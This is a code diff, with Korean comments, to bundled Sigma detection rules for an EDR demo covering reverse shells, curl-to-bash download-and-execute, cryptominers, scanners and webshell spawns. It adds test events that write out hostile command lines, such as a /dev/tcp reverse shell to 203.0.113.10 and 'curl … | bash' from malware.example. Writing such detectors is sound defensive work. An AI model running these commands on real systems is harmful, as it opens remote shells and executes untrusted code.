@@ -33,27 +33,71 @@ except ImportError:
 
 # 첫 실행 시 data/sigma 에 심어줄 샘플 룰 (EDR 데모 프로세스와 매칭되도록 구성)
 BUNDLED_RULES = {
-"lnx_reverse_shell.yml": """
-title: Linux Reverse Shell via /dev/tcp
-id: 7c2e2b6a-1f3a-4c11-9d21-aa11bb22cc01
+    # data/sigma 가 비어 있을 때만 쓰이는 사본이다. 파일과 어긋나면 새 환경이
+    # **다른 탐지 로직으로 뜬다** — 그것도 조용히. 그래서 파일에서 그대로 생성하고,
+    # tests/test_sigma_rules.py::test_bundled_rules_match_the_shipped_files 가
+    # 동기화를 강제한다. 손으로 고치지 말고 파일을 고친 뒤 다시 생성할 것.
+    "lnx_cryptominer.yml": """
+title: Cryptominer Execution
+id: 7c2e2b6a-1f3a-4c11-9d21-aa11bb22cc04
 status: stable
-description: bash/sh 가 /dev/tcp 로 리버스 셸을 여는 패턴
-level: critical
+description: |
+  크립토마이너 실행 — 알려진 마이너 바이너리 이름 또는 채굴 풀 접속 문자열.
+  이전에는 CommandLine 에 'pool' 만 있어도 매치했는데, 그 문자열은 정상
+  애플리케이션에 흔하다(gunicorn --worker-pool, -Dpool.maxSize 등 실측 오탐).
+  채굴 풀을 특정하는 문자열만 남겼다. 아래 tests 의 negative 가 그 회귀를 막는다.
+level: high
 logsource:
   product: linux
   category: process_creation
 tags:
-  - attack.execution
-  - attack.t1059.004
+  - attack.impact
+  - attack.t1496
 detection:
-  selection:
+  selection_bin:
+    Image|contains:
+      - 'xmrig'
+      - 'minerd'
+      - 'cpuminer'
+      - 'xmr-stak'
+  selection_pool:
     CommandLine|contains:
-      - '/dev/tcp/'
-      - 'bash -i'
-      - 'sh -i'
-  condition: selection
+      - 'stratum+tcp'
+      - 'stratum+ssl'
+      - 'minexmr'
+      - 'nanopool.org'
+      - 'supportxmr'
+  condition: selection_bin or selection_pool
+tests:
+  positive:
+    - name: xmrig 바이너리 (숨김 경로)
+      event:
+        Image: /tmp/.x/xmrig
+        CommandLine: /tmp/.x/xmrig -o pool.minexmr.com:4444 -u wallet
+        ParentImage: /usr/lib/systemd/systemd
+    - name: 이름을 바꿨어도 채굴 풀 접속 문자열로 잡는다
+      event:
+        Image: /usr/local/bin/systemd-worker
+        CommandLine: ./systemd-worker -o stratum+tcp://xmr.example:3333
+        ParentImage: /bin/bash
+  negative:
+    - name: gunicorn worker-pool (실측 오탐이었다)
+      event:
+        Image: /usr/bin/python3
+        CommandLine: python3 -m gunicorn --worker-pool=gevent app:app
+        ParentImage: /usr/lib/systemd/systemd
+    - name: JDBC 커넥션 풀 설정 (실측 오탐이었다)
+      event:
+        Image: /usr/bin/java
+        CommandLine: java -Dpool.maxSize=20 -jar service.jar
+        ParentImage: /usr/lib/systemd/systemd
+    - name: 평범한 파이썬 앱
+      event:
+        Image: /usr/bin/python3
+        CommandLine: python3 manage.py runserver
+        ParentImage: /bin/bash
 """,
-"lnx_download_exec.yml": """
+    "lnx_download_exec.yml": """
 title: Linux Download and Execute (curl/wget pipe to shell)
 id: 7c2e2b6a-1f3a-4c11-9d21-aa11bb22cc02
 status: stable
@@ -77,8 +121,116 @@ detection:
       - '|bash'
       - '|sh'
   condition: selection_tool and selection_pipe
+tests:
+  positive:
+    - name: curl 파이프 bash
+      event:
+        Image: /bin/sh
+        CommandLine: curl -s http://malware.example/x.sh | bash
+        ParentImage: /bin/bash
+    - name: wget 파이프 sh (공백 없음)
+      event:
+        Image: /bin/sh
+        CommandLine: wget -qO- http://malware.example/x |sh
+        ParentImage: /bin/bash
+  negative:
+    - name: 평범한 헬스체크 curl
+      event:
+        Image: /usr/bin/curl
+        CommandLine: curl -s https://api.example.com/health
+        ParentImage: /usr/sbin/cron
+    - name: 로컬 스크립트를 셸에 파이프 (다운로드 아님)
+      event:
+        Image: /bin/bash
+        CommandLine: cat /opt/setup.sh | bash
+        ParentImage: /bin/bash
 """,
-"lnx_webshell_spawn.yml": """
+    "lnx_reverse_shell.yml": """
+title: Linux Reverse Shell via /dev/tcp
+id: 7c2e2b6a-1f3a-4c11-9d21-aa11bb22cc01
+status: stable
+description: bash/sh 가 /dev/tcp 로 리버스 셸을 여는 패턴
+level: critical
+logsource:
+  product: linux
+  category: process_creation
+tags:
+  - attack.execution
+  - attack.t1059.004
+detection:
+  selection:
+    CommandLine|contains:
+      - '/dev/tcp/'
+      - 'bash -i'
+      - 'sh -i'
+  condition: selection
+tests:
+  positive:
+    - name: 고전적인 bash 리버스 셸
+      event:
+        Image: /bin/bash
+        CommandLine: bash -i >& /dev/tcp/203.0.113.10/4444 0>&1
+        ParentImage: /usr/sbin/nginx
+    - name: /dev/tcp 로 직접 연결
+      event:
+        Image: /bin/bash
+        CommandLine: exec 3<>/dev/tcp/203.0.113.10/9001
+        ParentImage: /bin/bash
+  negative:
+    - name: 평범한 배포 스크립트
+      event:
+        Image: /bin/bash
+        CommandLine: bash /opt/deploy/release.sh --env prod
+        ParentImage: /usr/lib/systemd/systemd
+    - name: 로그에서 bash 를 grep (대소문자 무시 옵션)
+      event:
+        Image: /usr/bin/grep
+        CommandLine: grep -ri bash /var/log/syslog
+        ParentImage: /bin/bash
+""",
+    "lnx_scanner.yml": """
+title: Network Scanner Execution
+id: 7c2e2b6a-1f3a-4c11-9d21-aa11bb22cc05
+status: experimental
+description: nmap/masscan 등 스캐너 실행
+level: medium
+logsource:
+  product: linux
+  category: process_creation
+tags:
+  - attack.discovery
+  - attack.t1046
+detection:
+  selection:
+    Image|endswith:
+      - '/nmap'
+      - '/masscan'
+  condition: selection
+tests:
+  positive:
+    - name: nmap SYN 스캔
+      event:
+        Image: /usr/bin/nmap
+        CommandLine: nmap -sS 192.168.1.0/24
+        ParentImage: /bin/bash
+    - name: masscan
+      event:
+        Image: /usr/local/bin/masscan
+        CommandLine: masscan -p1-65535 10.0.0.0/8
+        ParentImage: /bin/bash
+  negative:
+    - name: 이름이 nmap 으로 시작할 뿐인 다른 도구
+      event:
+        Image: /usr/bin/nmapsi4-helper
+        CommandLine: nmapsi4-helper --version
+        ParentImage: /bin/bash
+    - name: 평범한 ping
+      event:
+        Image: /usr/bin/ping
+        CommandLine: ping -c 4 8.8.8.8
+        ParentImage: /bin/bash
+""",
+    "lnx_webshell_spawn.yml": """
 title: Web Server Spawning Shell (Webshell)
 id: 7c2e2b6a-1f3a-4c11-9d21-aa11bb22cc03
 status: stable
@@ -103,49 +255,29 @@ detection:
       - '/sh'
       - '/dash'
   condition: selection_parent and selection_shell
-""",
-"lnx_cryptominer.yml": """
-title: Cryptominer Execution
-id: 7c2e2b6a-1f3a-4c11-9d21-aa11bb22cc04
-status: stable
-description: xmrig/minerd 등 크립토 마이너 실행 또는 마이닝 풀 접속
-level: high
-logsource:
-  product: linux
-  category: process_creation
-tags:
-  - attack.impact
-  - attack.t1496
-detection:
-  selection_bin:
-    Image|contains:
-      - 'xmrig'
-      - 'minerd'
-  selection_pool:
-    CommandLine|contains:
-      - 'pool'
-      - 'stratum+tcp'
-      - 'minexmr'
-  condition: selection_bin or selection_pool
-""",
-"lnx_scanner.yml": """
-title: Network Scanner Execution
-id: 7c2e2b6a-1f3a-4c11-9d21-aa11bb22cc05
-status: experimental
-description: nmap/masscan 등 스캐너 실행
-level: medium
-logsource:
-  product: linux
-  category: process_creation
-tags:
-  - attack.discovery
-  - attack.t1046
-detection:
-  selection:
-    Image|endswith:
-      - '/nmap'
-      - '/masscan'
-  condition: selection
+tests:
+  positive:
+    - name: apache2 가 bash 를 스폰
+      event:
+        Image: /bin/bash
+        CommandLine: bash -c id
+        ParentImage: /usr/sbin/apache2
+    - name: php-fpm 이 sh 를 스폰
+      event:
+        Image: /bin/sh
+        CommandLine: sh -c 'whoami'
+        ParentImage: /usr/sbin/php-fpm
+  negative:
+    - name: sshd 가 셸을 스폰 (정상 로그인)
+      event:
+        Image: /bin/bash
+        CommandLine: -bash
+        ParentImage: /usr/sbin/sshd
+    - name: nginx 가 셸이 아닌 프로세스를 스폰
+      event:
+        Image: /usr/bin/python3
+        CommandLine: python3 /srv/app/worker.py
+        ParentImage: /usr/sbin/nginx
 """,
 }
 
